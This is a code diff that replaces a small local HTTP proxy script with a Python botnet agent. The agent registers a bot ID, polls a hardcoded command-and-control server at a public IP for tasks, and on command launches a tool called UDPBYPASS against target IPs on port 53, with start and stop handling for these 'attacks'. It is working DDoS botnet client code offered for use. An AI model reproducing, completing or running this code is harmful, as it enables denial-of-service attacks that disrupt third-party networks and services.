@@ -1,100 +1,118 @@
-import socket
-import threading
+import requests
+import subprocess
+import os
+import time
+import sys
+import uuid
 
-LISTEN_HOST = "127.0.0.1"
-LISTEN_PORT = 8080
+# === BOT SETTINGS ===
+API_URL = "http://8.210.162.236:5000" # CHANGE THIS TO YOUR API IP
+POLL_INTERVAL = 1 
+ID_FILE = "bot_id.txt"              
+# =====================
 
-# ---------- utils ----------
+active_processes = {}
 
-def relay(src, dst):
+def get_or_create_bot_id():
+    if os.path.exists(ID_FILE):
+        with open(ID_FILE, "r") as f:
+            bot_id = f.read().strip()
+            if bot_id:
+                return bot_id
+                
+    bot_id = f"Bot-{uuid.uuid4().hex[:6]}"
+    with open(ID_FILE, "w") as f:
+        f.write(bot_id)
+        
+    return bot_id
+
+def execute_start(ip):
+    if not os.path.exists("./UDPBYPASS"):
+        print(f"[!] ERROR: ./UDPBYPASS not found!")
+        return False
+
+    print(f"[+] Command START {ip}:53. Running tool...")
+    try:
+        proc = subprocess.Popen(
+            ["./UDPBYPASS", ip, "53"],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
+        active_processes[ip] = proc
+        print(f"[OK] Attack on {ip} started (PID: {proc.pid})")
+        return True
+    except Exception as e:
+        print(f"[-] Start error: {e}")
+        return False
+
+def execute_stop(ip=None):
+    targets_to_stop = [ip] if ip else list(active_processes.keys())
+    
+    if not targets_to_stop:
+        print("[i] Nothing to stop.")
+        return
+
+    for target in targets_to_stop:
+        if target in active_processes:
+            proc = active_processes[target]
+            print(f"[*] Command STOP for {target}. Killing PID {proc.pid}...")
+            try:
+                proc.terminate()
+                proc.wait(timeout=3)
+                print(f"[OK] Attack on {target} stopped.")
+            except:
+                proc.kill()
+                print(f"[OK] Attack on {target} force killed.")
+            finally:
+                del active_processes[target]
+
+def check_for_commands(bot_id):
+    try:
+        response = requests.get(f"{API_URL}/get_task", params={"bot_id": bot_id}, timeout=3)
+        data = response.json()
+
+        if data.get("status") == "active":
+            cmd = data.get("command")
+            ip = data.get("ip")
+
+            if cmd == "start":
+                execute_start(ip)
+            elif cmd == "stop":
+                if ip:
+                    execute_stop(ip)
+                else:
+                    execute_stop()
+
+    except requests.exceptions.RequestException:
+        pass 
+    except Exception as e:
+        print(f"[-] Poll error: {e}")
+
+def cleanup_and_exit():
+    print("\n[*] Exiting... Stopping local attacks...")
+    for ip, proc in active_processes.items():
+        proc.kill()
+    print("[OK] Done.")
+    sys.exit(0)
+
+def main():
+    BOT_ID = get_or_create_bot_id()
+    
+    print(f"=====================================")
+    print(f"  Bot ID: {BOT_ID}")
+    print(f"  Server: {API_URL}")
+    print(f"  Tool:   ./UDPBYPASS")
+    print(f"=====================================")
+    print("Bot is running in background and listening to API.")
+    print("Press Ctrl+C to exit and stop all attacks.")
+    print("=====================================\n")
+
     try:
         while True:
-            data = src.recv(4096)
-            if not data:
-                break
-            dst.sendall(data)
-    except:
-        pass
-    finally:
-        try:
-            src.close()
-            dst.close()
-        except:
-            pass
+            check_for_commands(BOT_ID)
+            time.sleep(POLL_INTERVAL)
+    except KeyboardInterrupt:
+        cleanup_and_exit()
 
-# ---------- HTTP proxy ----------
-
-def handle_client(client):
-    try:
-        request = client.recv(8192)
-        if not request:
-            client.close()
-            return
-
-        header = request.decode(errors="ignore")
-        first_line = header.split("\r\n")[0]
-
-        # ---------- HTTPS (CONNECT) ----------
-        if first_line.startswith("CONNECT"):
-            _, target, _ = first_line.split()
-            host, port = target.split(":")
-            port = int(port)
-
-            remote = socket.create_connection((host, port))
-            client.sendall(b"HTTP/1.1 200 Connection Established\r\n\r\n")
-
-            t1 = threading.Thread(target=relay, args=(client, remote), daemon=True)
-            t2 = threading.Thread(target=relay, args=(remote, client), daemon=True)
-            t1.start()
-            t2.start()
-            return
-
-        # ---------- HTTP ----------
-        else:
-            lines = header.split("\r\n")
-            host = None
-            for line in lines:
-                if line.lower().startswith("host:"):
-                    host = line.split(":", 1)[1].strip()
-                    break
-
-            if not host:
-                client.close()
-                return
-
-            if ":" in host:
-                host, port = host.split(":")
-                port = int(port)
-            else:
-                port = 80
-
-            remote = socket.create_connection((host, port))
-            remote.sendall(request)
-
-            relay(remote, client)
-
-    except Exception as e:
-        print("Client error:", e)
-        try:
-            client.close()
-        except:
-            pass
-
-# ---------- server ----------
-
-def start_proxy():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    s.bind((LISTEN_HOST, LISTEN_PORT))
-    s.listen(200)
-
-    print(f"[+] HTTP proxy listening on {LISTEN_HOST}:{LISTEN_PORT}")
-
-    while True:
-        client, _ = s.accept()
-        threading.Thread(target=handle_client, args=(client,), daemon=True).start()
-
-# ---------- main ----------
-
-if __name__ == "__main__":
-    start_proxy()
+if __name__ == '__main__':
+    main()
